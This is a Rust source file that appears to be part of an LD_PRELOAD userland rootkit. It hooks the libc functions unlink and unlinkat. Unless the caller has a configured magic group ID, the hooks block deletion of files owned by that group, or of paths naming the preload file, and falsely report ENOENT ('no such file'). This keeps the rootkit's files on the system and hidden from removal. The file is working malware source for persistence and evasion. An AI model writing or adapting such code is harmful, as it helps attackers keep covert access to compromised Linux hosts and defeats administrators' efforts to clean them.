use std::ffi::{c_void, c_char, c_int, CStr};
use libc::getegid;
use errno::{Errno, set_errno};

use config::{GID, PRELOAD};
use stat::__lxstat;

#[no_mangle]
pub extern "C" fn unlink(path: *const c_char) -> c_int {
    let o_unlink: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"unlink\0".as_ptr() as *const _) };
    let o_unlink: extern "C" fn(*const c_char) -> c_int = unsafe { std::mem::transmute(o_unlink) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_unlink(path);
    }

    let mut stat_buf: libc::stat = unsafe { std::mem::zeroed() };
    __lxstat(2, path, &mut stat_buf);

    if (stat_buf.st_gid == GID) || unsafe { CStr::from_ptr(path).to_str().unwrap().contains(PRELOAD) }{
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return o_unlink(path);
}

#[no_mangle]
pub extern "C" fn unlinkat(fd: c_int, path: *const c_char, flags: c_int) -> c_int {
    let o_unlinkat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"unlinkat\0".as_ptr() as *const _) };
    let o_unlinkat: extern "C" fn(c_int, *const c_char, c_int) -> c_int = unsafe { std::mem::transmute(o_unlinkat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_unlinkat(fd, path, flags);
    }

    let mut stat_buf: libc::stat = unsafe { std::mem::zeroed() };
    __lxstat(2, path, &mut stat_buf);

    if stat_buf.st_gid == GID || unsafe { CStr::from_ptr(path).to_str().unwrap().contains(PRELOAD) } {
        set_errno(Errno(libc::ENOENT));
        return -1
    }

    return o_unlinkat(fd, path, flags);
}
